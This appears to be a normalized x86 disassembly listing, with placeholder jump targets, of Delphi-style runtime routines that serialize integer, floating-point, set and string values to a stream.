mov eax [ ebp - 0x4 ]
call sub_41b5c4
mov edx [ ebp - 0xc ]
mov eax esi
call sub_405388
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b6a8
cmp al 0x9
sete al
neg al
sbb eax eax
mov [ esi + 0x8 ] ax
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41bbf8
pop ecx
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_4052fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a864
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
cmp ax 0xa
je r-xdata
mov eax esi
call sub_41215c
jmp r-xdata
sub_41bfb0
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax esi
call sub_41c17c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_41bfe8
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_41de18
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_41c010
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_41de18
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_41c0f4
sub_41c054
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_4188e0
cmp eax esi
jg r-xdata
mov eax ebx
call sub_41c17c
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_418900
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_41c0a8
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41c17c
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41c0f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c16c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_41e064
mov eax [ ebp - 0x4 ]
call sub_418914
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41c0a8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41c0a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c173
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_41c1a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41c1eb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40460c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41df5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c1f2
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_41c1f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_41c28a
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_41e064
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ca14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c291
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_4171e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_41ca0c
mov edx esi
mov eax edi
call sub_4171ec
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41ca60
mov eax [ ebp - 0x4 ]
call sub_41ca14
inc esi
dec ebx
jne r-xdata
sub_41c298
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_4161a0
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40873c
test al al
jne r-xdata
sub_41c2e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41c3b6
push [ fs : eax ]
mov [ fs : eax ] esp
or [ ebx + 0x1c ] 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x8 ]
call sub_41c298
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
and [ ebx + 0x1c ] 0xfffb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c3bd
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov esi [ ebp - 0x4 ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x44 ]
call [ esi + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x20 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
sub_41c3c4
push ebp
mov ebp esp
add esp 0xfffffec8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x138 ] ecx
mov [ ebp - 0x12c ] ecx
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x134 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c7a0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403610
xor ebx ebx
mov bl [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_4046e4
add ebx eax
inc ebx
add ebx 0x5
add ebx 0x3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x10 ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c03c
mov [ ebp - 0xc ] eax
mov al [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c17c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
mov dl [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_41ca1c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403610
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x138 ]
call sub_404688
mov edx [ ebp - 0x138 ]
mov eax [ ebp - 0x4 ]
call sub_41de7c
mov eax [ ebp - 0x8 ]
call sub_403608
call sub_403900
call sub_41252c
lea edx [ eax + 0xa ]
lea eax [ ebp - 0x130 ]
call sub_404688
push [ ebp - 0x130 ]
push r-xdata
lea edx [ ebp - 0x128 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403610
lea edx [ ebp - 0x128 ]
lea eax [ ebp - 0x134 ]
call sub_404688
push [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
mov edx 0x3
call sub_4047a4
mov edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_41de7c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41ca60
mov eax [ ebp - 0x4 ]
call sub_41ca14
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_41c741
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41de7c
mov eax [ ebp - 0x4 ]
call sub_41c03c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4161a0
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c748
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_41c6ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_41c2e8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4036c0
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_41bfdc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_4038bc
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_41c748
mov eax [ ebp - 0x4 ]
call sub_41ca14
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c7a7
lea eax [ ebp - 0x138 ]
mov edx 0x4
call sub_404450
retn
mov al [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c03c
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41c054
sub_41c7c4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x28 ] ecx
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x18 ] esi
mov [ ebx + 0x1c ] esi
mov eax ebx
call sub_41de6c
mov edx esi
mov eax ebx
call sub_41c2e8
pop esi
pop ebx
retn
sub_41c7ec
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_41e064
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_41c0a8
pop ebx
pop ebp
retn 0xc
sub_41c810
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_41e064
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41c0a8
pop ebx
pop ebp
retn 0x4
sub_41c834
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_41e064
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41c0a8
pop ebx
pop ebp
retn 0x8
sub_41c858
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_41e064
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41c0a8
pop ebx
pop ebp
retn 0x8
sub_41c87c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_40873c
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_40873c
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_41e064
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_40873c
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_41e064
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_40873c
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_41e064
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_41e064
mov edx esi
mov eax ebx
call sub_41de7c
mov dl 0xd
mov eax ebx
call sub_41e064
jmp r-xdata
sub_41c940
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_41e064
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c0a8
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_41e064
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c0a8
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_41e064
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41c0a8
jmp r-xdata
pop edx
pop ebx
retn
sub_41c9b4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_41e064
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_41c0a8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_41c940
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_41ca1c
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
mov al [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov al [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_41c0a8
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_41c940
sub_41ca60
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403900
call sub_41252c
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
shl eax 0x2
call sub_402744
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41cb0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_403900
mov edx [ ebp - 0x10 ]
call sub_41274c
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x2
mov eax [ ebp - 0x10 ]
call sub_402764
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4127a0
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d908
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_41cb28
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_403608
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov eax [ eax ]
call sub_4038ec
test al al
jne r-xdata
mov al 0x1
pop ebp
retn
sub_41cb70
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41cbb8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_404688
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41de18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cbbf
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_41cbc4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_41cc4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41252c
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_41e064
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_412538
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41de7c
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_41de7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cc51
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_41cc58
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_41ccb8
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_415988
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41c940
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41c87c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ccbf
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_41ccc4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41cd5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_41cb70
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_4044c4
xor eax eax
push ebp
push sub_41cd3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_40442c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41c1f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd44
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_404480
retn
sub_41cd68
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call sub_41cb28
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_4127d0
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
sete al
pop ebp
retn
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
pop ebp
retn
mov al 0x1
sub_41cdc4
push ebp
mov ebp esp
add esp 0xfffffff8
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41ce8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4127d0
mov [ ebp - 0x4 ] eax
push ebp
call sub_41cd68
pop ecx
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce94
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41cb70
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax ]
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_41cc58
pop ecx
jmp r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c1a8
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_412538
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c87c
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41cbc4
pop ecx
jmp r-xdata
jmp r-xdata
sub_41ce98
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call sub_41cb28
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
fld [ eax - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
sete al
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_412d00
mov eax [ ebp + 0x8 ]
fld [ eax - 0x10 ]
fcompp
fnstsw ax
sahf
sete al
pop ebp
retn
sub_41cef0
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_412d00
fstp [ ebp - 0x10 ]
fwait
push ebp
call sub_41ce98
pop ecx
test al al
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41cb70
pop ecx
mov ax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c7ec
sub_41cf3c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call sub_41cb28
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_41311c
mov ecx [ ebp + 0x8 ]
cmp edx [ ecx - 0x4 ]
jne r-xdata
sete al
pop ebp
retn
cmp [ eax - 0x8 ] 0x0
sete al
pop ebp
retn
cmp eax [ ecx - 0x8 ]
sub_41cf8c
push ebp
mov ebp esp
add esp 0xfffffff8
